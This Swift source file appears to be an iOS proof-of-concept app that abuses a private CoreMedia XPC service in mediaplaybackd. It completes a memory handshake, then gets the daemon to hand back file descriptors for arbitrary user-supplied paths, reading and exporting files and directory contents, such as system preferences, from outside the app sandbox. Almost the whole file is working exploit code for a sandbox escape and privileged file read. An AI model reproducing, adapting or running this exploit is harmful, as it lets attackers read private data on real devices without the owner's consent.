//
//  ContentView.swift
//  MConfPoC
//
//  CoreMedia bytestream PoC.
//  Runs only on explicit Run-button press. The target path is supplied in the UI.
//  Results and short execution messages are saved inside Documents/.
//

import Foundation
import SwiftUI
import UIKit
import Darwin
import CoreFoundation

// MARK: - Logging

private let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
private var logFd: Int32 = -1

private func resetSessionLogFile() {
    let path = docs.appendingPathComponent("run.log").path
    let fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
    if fd >= 0 { close(fd) }
}

private func openLog() {
    if logFd >= 0 { close(logFd); logFd = -1 }
    let path = docs.appendingPathComponent("run.log").path
    logFd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
}

private final class EHBox {
    var desc = ""
    var seen = false
}

private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
    guard let pointer else { return }
    Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
}

// MARK: - ContentView

private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"

private func outputFilename(for targetPath: String) -> String {
    let name = URL(fileURLWithPath: targetPath).lastPathComponent
    let safeName = name.isEmpty || name == "/" ? "target.bin" : name
    return safeName
}

private func recoveredFileURL(for targetPath: String) -> URL {
    let filename = targetPath == legacyTargetPath
        ? "GlobalPreferences.plist"
        : outputFilename(for: targetPath)
    return docs.appendingPathComponent(filename)
}

private func recoveredDirectoryURL(for targetPath: String) -> URL {
    docs.appendingPathComponent(outputFilename(for: targetPath) + ".directory.txt")
}

private struct ActivityView: UIViewControllerRepresentable {
    let activityItems: [Any]

    func makeUIViewController(context: Context) -> UIActivityViewController {
        UIActivityViewController(activityItems: activityItems, applicationActivities: nil)
    }

    func updateUIViewController(_ controller: UIActivityViewController, context: Context) {}
}

struct ContentView: View {
    @State private var status = "Ready"
    @State private var isRunning = false
    @State private var targetPath = ""
    @State private var logs: [String] = []
    @State private var showExport = false
    @State private var resultURL: URL? = nil
    @State private var didResetSessionLog = false

    private let panelColor = Color(uiColor: .secondarySystemBackground)
    private let panelShape = RoundedRectangle(cornerRadius: 20, style: .continuous)

    var body: some View {
        GeometryReader { geometry in
            VStack(alignment: .leading, spacing: 14) {
                VStack(alignment: .leading, spacing: 10) {
                    Text("CoreMedia PoC")
                        .font(.headline)
                    Text(status)
                        .font(.system(.footnote, design: .monospaced))
                        .foregroundStyle(.secondary)
                }

                VStack(alignment: .leading, spacing: 6) {
                    Text("Target path")
                        .font(.footnote)
                        .foregroundStyle(.secondary)
                    TextField("Enter target path", text: $targetPath)
                        .font(.system(.body, design: .monospaced))
                        .textInputAutocapitalization(.never)
                        .autocorrectionDisabled()
                        .textFieldStyle(.plain)
                        .padding(.horizontal, 14)
                        .padding(.vertical, 16)
                        .background(panelColor)
                        .clipShape(panelShape)
                        .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                }

                Button {
                    guard !isRunning else { return }
                    isRunning = true
                    status = "Running…"
                    resultURL = nil
                    if !logs.isEmpty {
                        logs.append("──────── New run ────────")
                    }
                    let requestedPath = targetPath
                    let trimmedPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
                    let expectedResultURL = recoveredFileURL(for: trimmedPath)
                    let expectedDirectoryURL = recoveredDirectoryURL(for: trimmedPath)
                    DispatchQueue.global(qos: .userInitiated).async {
                        runChain(targetPath: requestedPath) { line in
                            DispatchQueue.main.async {
                                logs.append(line)
                                if line.hasPrefix("Saved directory listing "),
                                   FileManager.default.fileExists(atPath: expectedDirectoryURL.path) {
                                    resultURL = expectedDirectoryURL
                                } else if line.hasPrefix("Saved "),
                                          FileManager.default.fileExists(atPath: expectedResultURL.path) {
                                    resultURL = expectedResultURL
                                }
                            }
                        }
                        DispatchQueue.main.async {
                            isRunning = false
                            status = "Finished — see Documents/run.log"
                        }
                    }
                } label: {
                    ZStack {
                        Text("Run")
                            .font(.system(size: 18, weight: .medium))
                            .foregroundStyle(.white)
                    }
                    .frame(maxWidth: .infinity)
                    .frame(height: 58)
                    .contentShape(panelShape)
                }
                .buttonStyle(.plain)
                .background(Color(uiColor: .systemBlue), in: panelShape)
                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                .disabled(isRunning)

                HStack {
                    Text("Run Log")
                        .font(.headline)
                        .foregroundStyle(.secondary)
                    Spacer()
                    Button("Clear", role: .destructive) {
                        logs.removeAll()
                        resetSessionLogFile()
                    }
                    .disabled(isRunning)
                }

                ScrollViewReader { proxy in
                    ScrollView {
                        VStack(alignment: .leading, spacing: 5) {
                            ForEach(Array(logs.enumerated()), id: \.offset) { index, line in
                                Text(line)
                                    .font(.system(.caption, design: .monospaced))
                                    .frame(maxWidth: .infinity, alignment: .leading)
                                    .id(index)
                            }
                        }
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .padding(12)
                    }
                    .onChange(of: logs.count) { _ in
                        if let lastIndex = logs.indices.last {
                            proxy.scrollTo(lastIndex, anchor: .bottom)
                        }
                    }
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
                .background(panelColor)
                .clipShape(panelShape)
                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))

                Button {
                    guard resultURL != nil else { return }
                    showExport = true
                } label: {
                    Label("Export result", systemImage: "square.and.arrow.up")
                        .font(.body.weight(.medium))
                        .foregroundStyle(.primary)
                        .frame(maxWidth: .infinity)
                        .frame(height: 50)
                        .contentShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                }
                .buttonStyle(.plain)
                .background(panelColor, in: RoundedRectangle(cornerRadius: 16, style: .continuous))
                .overlay(RoundedRectangle(cornerRadius: 16, style: .continuous).stroke(Color.white.opacity(0.07), lineWidth: 1))
                .disabled(resultURL == nil || isRunning)
                .opacity(resultURL == nil || isRunning ? 0.45 : 1)
            }
            .padding(.horizontal)
            .padding(.top, 84)
            .padding(.bottom, 8)
            .frame(width: geometry.size.width, height: geometry.size.height, alignment: .top)
        }
        .background(Color.black.ignoresSafeArea())
        .preferredColorScheme(.dark)
        .onAppear {
            guard !didResetSessionLog else { return }
            resetSessionLogFile()
            didResetSessionLog = true
        }
        .sheet(isPresented: $showExport) {
            if let resultURL = resultURL {
                ActivityView(activityItems: [resultURL])
            }
        }
    }
}

// MARK: - The chain

private func runChain(targetPath requestedPath: String, onLog: @escaping (String) -> Void) {
    openLog()
    defer { if logFd >= 0 { close(logFd); logFd = -1 } }
    func logLine(_ message: String) {
        let line = message + "\n"
        if logFd >= 0 { _ = line.withCString { write(logFd, $0, strlen($0)) } }
        onLog(message)
    }
    logLine("Run started")
    let dev = UIDevice.current
    logLine("Device: \(dev.model), iOS \(dev.systemVersion)")

    let targetPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
    guard !targetPath.isEmpty, targetPath.hasPrefix("/") else {
        logLine("Invalid target: enter an absolute file or directory path")
        logLine("Run finished")
        return
    }
    let outputName = targetPath == legacyTargetPath
        ? "GlobalPreferences.plist"
        : outputFilename(for: targetPath)
    logLine("Target: \(targetPath)")

    // Step 1 — resolve symbols.
    guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
        logLine("CoreMedia load failed"); return
    }
    let rtld = UnsafeMutableRawPointer(bitPattern: -2)
    guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
          let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
          let pComp  = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
          let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
          let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
          let pConnCreate = dlsym(rtld, "xpc_connection_create_mach_service"),
          let pSetEH = dlsym(rtld, "xpc_connection_set_event_handler"),
          let pResume = dlsym(rtld, "xpc_connection_resume"),
          let pConnCancel = dlsym(rtld, "xpc_connection_cancel"),
          let pSendReply = dlsym(rtld, "xpc_connection_send_message_with_reply"),
          let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
          let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
          let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
          let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
          let pGetData = dlsym(rtld, "xpc_dictionary_get_data"),
          let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
          let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
          let pDesc = dlsym(rtld, "xpc_copy_description"),
          let pType = dlsym(rtld, "xpc_get_type"),
          let pTypeName = dlsym(rtld, "xpc_type_get_name"),
          let pRetain = dlsym(rtld, "xpc_retain"),
          let pRel = dlsym(rtld, "xpc_release") else {
        logLine("Required symbol missing"); return
    }

    typealias FBasic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FBegin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
    typealias FComp = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FRecip = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FSetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
    typealias FConnCreate = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
    typealias FSetEH = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FResume = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FConnCancel = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FSendReply = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FVal = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
    typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
    typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
    typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
    typealias FGetData = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UnsafeMutablePointer<Int>?) -> UnsafeRawPointer?
    typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
    typealias FSetI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
    typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
    typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
    typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
    typealias FRetain = @convention(c) (OpaquePointer?) -> Void
    typealias FRel = @convention(c) (OpaquePointer?) -> Void

    let fBasic = unsafeBitCast(pBasic, to: FBasic.self)
    let fBegin = unsafeBitCast(pBegin, to: FBegin.self)
    let fComp = unsafeBitCast(pComp, to: FComp.self)
    let fRecip = unsafeBitCast(pRecip, to: FRecip.self)
    let fSetURL = unsafeBitCast(pSetURL, to: FSetURL.self)
    let fConnCreate = unsafeBitCast(pConnCreate, to: FConnCreate.self)
    let fSetEH = unsafeBitCast(pSetEH, to: FSetEH.self)
    let fResume = unsafeBitCast(pResume, to: FResume.self)
    let fConnCancel = unsafeBitCast(pConnCancel, to: FConnCancel.self)
    let fSendReply = unsafeBitCast(pSendReply, to: FSendReply.self)
    let fVal = unsafeBitCast(pVal, to: FVal.self)
    let fU64 = unsafeBitCast(pU64, to: FU64.self)
    let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
    let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
    let fGetData = unsafeBitCast(pGetData, to: FGetData.self)
    let fI64 = unsafeBitCast(pI64, to: FI64.self)
    let fSetI64 = unsafeBitCast(pSetI64, to: FSetI64.self)
    let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
    let fType = unsafeBitCast(pType, to: FType.self)
    let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
    let fRetain = unsafeBitCast(pRetain, to: FRetain.self)
    let fRel = unsafeBitCast(pRel, to: FRel.self)

    func desc(_ o: OpaquePointer?) -> String {
        guard let o = o, let c = fDesc(o) else { return "nil" }
        defer { free(c) }
        return String(cString: c).replacingOccurrences(of: "\n", with: " ")
    }
    func typeName(_ o: OpaquePointer?) -> String {
        guard let o = o, let t = fType(o), let n = fTypeName(t) else { return "?" }
        return String(cString: n)
    }

    // Step 2 — connect.
    guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
        logLine("XPC connection failed"); return
    }
    let ehBox = EHBox()
    let eh: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
        guard let obj = obj else { return }
        ehBox.desc = "\(typeName(OpaquePointer(obj))): \(String(desc(OpaquePointer(obj)).prefix(200)))"
        ehBox.seen = true
    }
    fSetEH(conn, eh as AnyObject)
    fResume(conn)
    logLine("XPC connected")

    func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
        guard let m = m else { return (nil, "nil") }
        let sem = DispatchSemaphore(value: 0)
        var out: OpaquePointer? = nil
        var tn = "?"
        let hb: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
            guard let obj = obj else { sem.signal(); return }
            tn = typeName(OpaquePointer(obj))
            if tn == "dictionary" || tn == "error" {
                fRetain(OpaquePointer(obj))
                out = OpaquePointer(obj)
            }
            sem.signal()
        }
        fSendReply(conn, m, nil, hb as AnyObject)
        if sem.wait(timeout: .now() + 8) != .success { return (nil, "timeout-8s") }
        return (out, tn)
    }

    // Step 3 — memory-origin handshake.
    var memoryRecipient: UnsafeMutableRawPointer? = nil
    var memoryOrigin: UnsafeMutableRawPointer? = nil

    var rp2Ready = false
    var handshakeReady = false

    var rp1Msg: UnsafeMutableRawPointer? = nil
    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {
        let (r1, t1) = send(m1)
        let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
        logLine("Handshake 1: \(t1)\(replyDetail)")
        fRel(OpaquePointer(m1))

        if let r1 = r1, t1 == "dictionary" {
            var rp2Msg: UnsafeMutableRawPointer? = nil
            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {
                let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
                logLine("Recipient creation: status=\(cr), object=\(memoryRecipient == nil ? "nil" : "present")")

                if cr == 0, memoryRecipient != nil {
                    let (r2, t2) = send(m2)
                    let replyDetail2 = (t2 == "error") ? " — \(desc(r2))" : ""
                    logLine("Handshake 2: \(t2)\(replyDetail2)")
                    rp2Ready = (t2 == "dictionary" && r2 != nil)
                    if let r2 = r2 { fRel(r2) }
                } else {
                    logLine("Handshake 2 skipped: memory recipient was not created")
                }
                fRel(OpaquePointer(m2))
            } else {
                logLine("Handshake 2 message creation failed")
            }
            fRel(r1)
        }
    } else {
        logLine("Handshake 1 message creation failed")
    }

    if rp2Ready {
        var orgMsg: UnsafeMutableRawPointer? = nil
        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {
            let bg = fBegin(om)
            logLine("Origin begin: status=\(bg)")
            if bg == 0 {
                let (or, ot) = send(om)
                let originReplyDetail = (ot == "error") ? " — \(desc(or))" : ""
                logLine("Origin: \(ot)\(originReplyDetail)")
                if let or = or {
                    if ot == "dictionary" {
                        let cp = fComp(or, &memoryOrigin)
                        handshakeReady = (cp == 0 && memoryOrigin != nil)
                        logLine("Origin established: \(handshakeReady ? "yes" : "no (status=\(cp))")")
                    } else {
                        logLine("Origin response was not a dictionary")
                    }
                    fRel(or)
                }
            } else {
                logLine("Origin begin failed; .org request skipped")
            }
            fRel(OpaquePointer(om))
        } else {
            logLine("Origin message creation failed")
        }
    } else {
        logLine("Origin handshake skipped: .rp1/.rp2 did not complete")
    }

    func directoryEntryName(_ entry: UnsafeMutablePointer<dirent>) -> String {
        let capacity = MemoryLayout.size(ofValue: entry.pointee.d_name)
        return withUnsafePointer(to: &entry.pointee.d_name) { namePointer in
            namePointer.withMemoryRebound(to: CChar.self, capacity: capacity) {
                String(cString: $0)
            }
        }
    }

    /// Перечисляет папку и возвращает обычные файлы (с fallback через d_type на случай сбоя fstatat)
    func getFilesInDirectory(fd: Int32) -> [String] {
        guard let directory = fdopendir(fd) else {
            let savedErrno = errno
            close(fd)
            logLine("Directory stream creation failed: errno=\(savedErrno)")
            return []
        }
        defer { closedir(directory) }

        let directoryFD = dirfd(directory)
        var fileNames: [String] = []

        while true {
            errno = 0
            guard let entry = readdir(directory) else { break }
            let name = directoryEntryName(entry)
            if name == "." || name == ".." { continue }

            var isRegularFile = false

            var itemStat = stat()
            let statResult = name.withCString {
                fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
            }
            
            if statResult == 0 {
                if (itemStat.st_mode & mode_t(S_IFMT)) == mode_t(S_IFREG) {
                    isRegularFile = true
                }
            } else {
                // Если fstatat не прошел, используем d_type из dirent (исключая папки DT_DIR)
                let dType = entry.pointee.d_type
                if dType == UInt8(DT_REG) {
                    isRegularFile = true
                } else if dType != UInt8(DT_DIR) && dType != 4 {
                    isRegularFile = true
                }
            }

            if isRegularFile {
                fileNames.append(name)
            }
        }

        fileNames.sort { $0.localizedStandardCompare($1) == .orderedAscending }
        return fileNames
    }

    // Сохраняет одиночный файл
    func saveFile(fd: Int32, outputName: String) {
        defer { close(fd) }
        var st = stat()
        guard fstat(fd, &st) == 0 else {
            logLine("fstat failed: errno=\(errno)")
            return
        }

        let size = Int64(st.st_size)
        guard size > 0 else {
            logLine("File \(outputName) is empty (\(size) bytes)")
            return
        }
        guard size <= Int64(Int.max) else {
            logLine("File \(outputName) is too large: \(size) bytes")
            return
        }
        var buffer = [UInt8](repeating: 0, count: Int(size))
        let count = pread(fd, &buffer, buffer.count, 0)
        guard count > 0 else {
            logLine("Read failed for \(outputName): errno=\(errno)")
            return
        }
        let output = docs.appendingPathComponent(outputName)
        do {
            try Data(buffer.prefix(count)).write(to: output, options: .atomic)
            logLine("Saved \(count) bytes: \(outputName)")
        } catch {
            logLine("Save failed for \(outputName): \(error.localizedDescription)")
        }
    }

    // Проба пути через 'Curl' daemon
    func probe(_ path: String) -> Int32? {
        let cfURL = URL(fileURLWithPath: path) as CFURL
        var msg: UnsafeMutableRawPointer? = nil
        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {
            logLine("Request message failed for: \(path)"); return nil
        }
        _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
        fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
        let (rp, rt) = send(m)
        fRel(OpaquePointer(m))
        guard rt == "dictionary", let rp = rp else {
            logLine("Request failed for \(path): \(rt)")
            if let rp = rp { fRel(rp) }
            return nil
        }
        guard let details = fVal(rp, "ByteStreamDetails") else {
            let err = fI64(rp, ".ErrorReturn")
            logLine("Access denied for \(path) (\(err))")
            fRel(rp)
            return nil
        }
        let oid = fU64(details, "ObjectID")
        let fd = fDupFd(details, "FileDescriptor")

        // Закрываем стрим на сервере
        var mD: UnsafeMutableRawPointer? = nil
        if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
            let (rd, _) = send(mD)
            if let rd = rd { fRel(rd) }
            fRel(OpaquePointer(mD))
        }
        fRel(rp)

        return fd >= 0 ? fd : nil
    }

    if handshakeReady {
        logLine("Opening target path: \(targetPath)")
        if let initialFd = probe(targetPath) {
            var st = stat()
            if fstat(initialFd, &st) == 0 {
                let fileType = st.st_mode & mode_t(S_IFMT)
                if fileType == mode_t(S_IFDIR) {
                    logLine("Target is a directory. Enumerating regular files...")
                    let fileNames = getFilesInDirectory(fd: initialFd)
                    logLine("Found \(fileNames.count) regular file(s) inside directory.")

                    let basePath = targetPath.hasSuffix("/") ? targetPath : targetPath + "/"
                    for name in fileNames {
                        let fullFilePath = basePath + name
                        logLine("Reading file: \(name)")
                        if let fileFd = probe(fullFilePath) {
                            saveFile(fd: fileFd, outputName: name)
                        } else {
                            logLine("Failed to open file: \(name)")
                        }
                    }
                } else if fileType == mode_t(S_IFREG) {
                    logLine("Target is a single file.")
                    saveFile(fd: initialFd, outputName: outputName)
                } else {
                    close(initialFd)
                    logLine("Target is neither a regular file nor a directory.")
                }
            } else {
                close(initialFd)
                logLine("Failed to fstat target FD.")
            }
        } else {
            logLine("Failed to obtain initial FD for target path.")
        }
    } else {
        logLine("Read skipped: memory-origin handshake was not established")
    }

    releaseFigReference(memoryOrigin)
    memoryOrigin = nil
    releaseFigReference(memoryRecipient)
    memoryRecipient = nil

    fConnCancel(conn)
    fRel(OpaquePointer(conn))
    logLine("XPC connection cancelled and released")
    logLine("Run finished")
}
